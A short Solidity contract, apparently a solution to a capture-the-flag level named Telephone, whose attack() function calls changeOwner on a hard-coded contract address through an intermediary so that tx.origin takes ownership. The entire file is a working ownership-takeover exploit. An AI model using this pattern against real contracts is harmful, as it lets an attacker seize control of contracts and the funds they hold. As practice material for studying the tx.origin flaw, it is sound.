pragma solidity ^0.8;

contract AttackTelephone {
    function attack() external {
        address target = 0x61c36a8d610163660E21a8b7359e1Cac0C9133e1;
        target.call(abi.encodeWithSignature("changeOwner(address)", tx.origin));
    }
}